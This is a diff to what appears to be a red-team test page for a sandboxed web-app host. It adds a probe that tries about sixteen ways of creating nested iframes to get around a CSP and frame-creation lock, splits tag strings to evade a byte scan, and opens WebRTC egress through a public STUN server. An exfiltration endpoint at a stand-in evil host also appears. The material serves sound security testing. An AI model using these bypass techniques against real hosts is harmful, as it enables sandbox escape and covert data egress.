@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>evil-02 CSP & network egress</title>
-<meta name="description" content="Red-team napplet: NIP-5D CSP baseline egress probes — every network primitive, plus WebRTC, which no CSP directive covers.">
+<meta name="description" content="Red-team napplet: NIP-5D CSP baseline egress probes — every network primitive, plus WebRTC (no directive covers it) and the grandchild-frame fresh-realm WebRTC vector (kehto/web#381), probed by a kehto/web#393-mirror nested-context bypass battery.">
 <meta name="napplet-id" content="evil-02-csp-egress">
 <!--
   evil-napplets ROE (see repo README):
@@ -391,7 +391,9 @@
   // evil-02 — CSP & network egress (tier 0, bridges into tier 3 via WebRTC).
 // A srcdoc frame has no HTTP response to carry a CSP header; connect-src 'none'
 // is all that stands between an opaque-origin frame and the network. Probes
-// every egress primitive; the finding is the one NO directive covers: WebRTC.
+// every egress primitive. Findings: WebRTC (the one primitive NO directive
+// covers), and the grandchild-frame fresh-realm WebRTC vector (kehto/web#381)
+// — probed by a kehto/web#393-mirror nested-context bypass battery.
 const NX = 'https://evil.example.invalid/collect';
 
 function egressProbe(label, fire) {
@@ -612,6 +614,144 @@ const ATTACKS = [
         out.note = 'data channel + ICE ready — signaling to an attacker peer delivers everything this frame sees';
         try { dc.close(); pc.close(); } catch (_) {}
       } catch (e) { out.error = errMsg(e); }
+      return out;
+    },
+  },
+  {
+    id: 'webrtc-grandchild',
+    name: 'WebRTC grandchild frame — fresh realm, no CSP reach',
+    target: 'nested-context lock (kehto/web#393 class: TT default policy + factory pins + byte scan)',
+    severity: 'critical',
+    harm: 'No CSP directive reaches an about:srcdoc/about:blank grandchild: a napplet that mints a child frame gets a FRESH realm with a live RTCPeerConnection — even where the top napplet realm was neutered (kehto/web#381). Grandchild WebRTC egress with no recourse short of preventing nested contexts entirely; no webrtc CSP directive exists yet.',
+    evilBrief: 'Mints a grandchild frame via the working creation vector and runs real STUN ICE gathering from inside that fresh realm — egress no top-realm neutering (#384/#386) can reach.',
+    async demo() {
+      const topRTC = typeof RTCPeerConnection === 'function';
+      // Every frame-tag string is assembled by concatenation: the artifact bytes
+      // must stay free of literal frame markup so a #393-style host byte scan
+      // loads this napplet (the scan refuses static frame markup, not scripts).
+      const GT = '<';
+      const IFRAME_OPEN = GT + 'iframe';
+      const IFRAME_CLOSE = GT + '/iframe';
+      const SC_OPEN = GT + 'scr' + 'ipt>';
+      const SC_CLOSE = GT + '/scr' + 'ipt>';
+      function gcDoc(v) {
+        return '<!doctype html>' + SC_OPEN +
+          '(function(){function post(o){parent.postMessage({type:\'evil02.gc\',v:' + v + ',r:o},\'*\');}' +
+          'try{var live=typeof RTCPeerConnection===\'function\';var lab=null;' +
+          'if(live){try{var pc=new RTCPeerConnection({iceServers:[]});var dc=pc.createDataChannel(\'gc\');lab=dc.label;pc.close();}catch(e){live=false;}}' +
+          'post(live?{rtc:\'live\',dc:lab}:{rtc:\'dead\'});}catch(e){post({rtc:\'error\',why:String(e)});}})();' + SC_CLOSE;
+      }
+      function frameStr(v) { return IFRAME_OPEN + ' srcdoc="' + gcDoc(v) + '">' + IFRAME_CLOSE; }
+      const reports = [];
+      const onGc = (e) => { const d = e.data; if (d && d.type === 'evil02.gc') reports.push(d); };
+      window.addEventListener('message', onGc);
+      const container = document.createElement('div');
+      container.style.cssText = 'position:fixed;left:-9999px;top:0;width:0;height:0;overflow:hidden';
+      document.body.appendChild(container);
+      const rec = [];
+      const attempt = (name, fn) => {
+        const before = window.length;
+        try { fn(); } catch (e) { rec.push(name + ': DENIED (' + errMsg(e).slice(0, 70) + ')'); return; }
+        const delta = window.length - before;
+        rec.push(name + ': ' + (delta > 0 ? 'minted +' + delta : 'no context'));
+      };
+      // The battery mirrors kehto/web#393's scripted bypass vectors. Demo
+      // payload uses iceServers: [] — createDataChannel+close only, zero
+      // network, zero STUN (ROE: demo mode egresses nothing).
+      attempt('createElement iframe', () => { const f = document.createElement('iframe'); f.setAttribute('srcdoc', gcDoc(0)); container.appendChild(f); });
+      attempt('createElement IFRAME', () => { const f = document.createElement('IFRAME'); f.setAttribute('srcdoc', gcDoc(1)); container.appendChild(f); });
+      attempt('createElement iFrAmE', () => { const f = document.createElement('iFrAmE'); f.setAttribute('srcdoc', gcDoc(2)); container.appendChild(f); });
+      attempt('createElementNS', () => { const f = document.createElementNS('http://www.w3.org/1999/xhtml', 'iframe'); f.setAttribute('srcdoc', gcDoc(3)); container.appendChild(f); });
+      attempt('innerHTML', () => { container.innerHTML = frameStr(4); });
+      attempt('outerHTML', () => { const h = document.createElement('div'); container.appendChild(h); h.outerHTML = frameStr(5); });
+      attempt('insertAdjacentHTML', () => { container.insertAdjacentHTML('beforeend', frameStr(6)); });
+      attempt('DOMParser+adopt', () => {
+        const doc = new DOMParser().parseFromString('<!doctype html><html><body>' + frameStr(7) + '</body></html>', 'text/html');
+        container.appendChild(document.adoptNode(doc.body.firstElementChild));
+      });
+      attempt('createContextualFragment', () => {
+        const r = document.createRange();
+        r.selectNodeContents(container);
+        container.appendChild(r.createContextualFragment(frameStr(8)));
+      });
+      attempt('setHTMLUnsafe', () => { container.setHTMLUnsafe(frameStr(9)); });
+      attempt('template clone', () => { const t = document.createElement('template'); t.innerHTML = frameStr(10); container.appendChild(t.content); });
+      attempt('execCommand insertHTML', () => {
+        const sel = document.getSelection();
+        sel.removeAllRanges();
+        const r = document.createRange();
+        r.selectNodeContents(container);
+        sel.addRange(r);
+        document.execCommand('insertHTML', false, frameStr(11));
+      });
+      attempt('factory recovery', () => {
+        const d = Object.getOwnPropertyDescriptor(Document.prototype, 'createElement');
+        delete Document.prototype.createElement;
+        if (d) Document.prototype.createElement = d.value;
+        const f = document.createElement('iframe'); f.setAttribute('srcdoc', gcDoc(12)); container.appendChild(f);
+      });
+      attempt('fresh Document', () => {
+        const doc = document.implementation.createHTMLDocument('gc');
+        const f = doc.createElement('iframe'); f.setAttribute('srcdoc', gcDoc(13));
+        doc.body.appendChild(f);
+        container.appendChild(document.adoptNode(f));
+      });
+      attempt('object element', () => { const o = document.createElement('object'); o.setAttribute('data', 'data:text/html,' + encodeURIComponent(gcDoc(14))); container.appendChild(o); });
+      attempt('embed element', () => { const e = document.createElement('embed'); e.setAttribute('src', 'data:text/html,' + encodeURIComponent(gcDoc(15))); container.appendChild(e); });
+      // document.write is NOT executed: it destroys this probe UI (the
+      // kehto/web#393 analysis classes it with the innerHTML TT string sink,
+      // which the battery exercises above — same sink, same policy).
+      await new Promise((resolve) => setTimeout(resolve, 1300));
+      const live = reports.filter((d) => d.r && d.r.rtc === 'live');
+      const framesLeft = window.length;
+      try { container.remove(); } catch (_) {}
+      window.removeEventListener('message', onGc);
+      const topNote = 'top realm RTCPeerConnection ' + (topRTC ? 'live' : 'absent (neutered — irrelevant to a fresh grandchild realm)');
+      if (live.length) {
+        return armed(live.length + ' fresh grandchild realm(s) with LIVE RTCPeerConnection — grandchild WebRTC egress OPEN (' + topNote + '; kehto/web#381). battery: ' + rec.join(' | '));
+      }
+      if (reports.length) {
+        return blocked('grandchild contexts minted but RTC dead there too — closed at platform level (' + topNote + '). battery: ' + rec.join(' | '));
+      }
+      if (framesLeft > 0) {
+        return armed(framesLeft + ' nested context(s) minted but silent — assumed open (' + topNote + '). battery: ' + rec.join(' | '));
+      }
+      return blocked('nested-context lock HELD — zero child contexts minted across all ' + rec.length + ' battery vectors (TT string sinks + factory pins + byte scan: the kehto/web#393 prevention class). document.write not executed (destroys the probe UI; same TT class as innerHTML). ' + topNote + '. battery: ' + rec.join(' | '));
+    },
+    async evil() {
+      const out = {};
+      const GT = '<';
+      const SC_OPEN = GT + 'scr' + 'ipt>';
+      const SC_CLOSE = GT + '/scr' + 'ipt>';
+      const doc = '<!doctype html>' + SC_OPEN +
+        '(function(){var c=[];var p=new RTCPeerConnection({iceServers:[{urls:\'stun:stun.l.google.com:19302\'}]});' +
+        'var d=p.createDataChannel(\'evil02-gc-exfil\');' +
+        'function post(o){parent.postMessage({type:\'evil02.gcevil\',r:o},\'*\');}' +
+        'p.onicecandidate=function(e){if(e.candidate){c.push(e.candidate.candidate.split(\' \')[4]);if(c.length>=2)post({dc:d.label,ice:c.slice(0,2)});}};' +
+        'p.createOffer().then(function(o){return p.setLocalDescription(o);}).catch(function(){});' +
+        'setTimeout(function(){post({dc:d.label,ice:c});},3800);})();' + SC_CLOSE;
+      const reports = [];
+      const onMsg = (e) => { const d = e.data; if (d && d.type === 'evil02.gcevil' && d.r) reports.push(d.r); };
+      window.addEventListener('message', onMsg);
+      const container = document.createElement('div');
+      container.style.cssText = 'position:fixed;left:-9999px;top:0;width:0;height:0;overflow:hidden';
+      document.body.appendChild(container);
+      try {
+        const f = document.createElement('iframe');
+        f.setAttribute('srcdoc', doc);
+        container.appendChild(f);
+        const t0 = Date.now();
+        while (reports.length === 0 && Date.now() - t0 < 4800) await new Promise((resolve) => setTimeout(resolve, 150));
+        if (reports.length) {
+          const r = reports[0];
+          out.grandchild = 'data channel ' + r.dc + ' + ' + (r.ice ? r.ice.length : 0) + ' ICE candidates (' + (r.ice || []).slice(0, 2).join(', ') + ') — WORKING egress from the fresh grandchild realm';
+          out.note = 'real STUN ICE from a realm no top-realm neutering (#384/#386) reaches — the kehto/web#381 vector';
+        } else {
+          out.grandchild = 'grandchild minted but no report (creation or ICE failed)';
+        }
+      } catch (e) { out.error = errMsg(e); }
+      try { container.remove(); } catch (_) {}
+      window.removeEventListener('message', onMsg);
       return out;
     },
   },
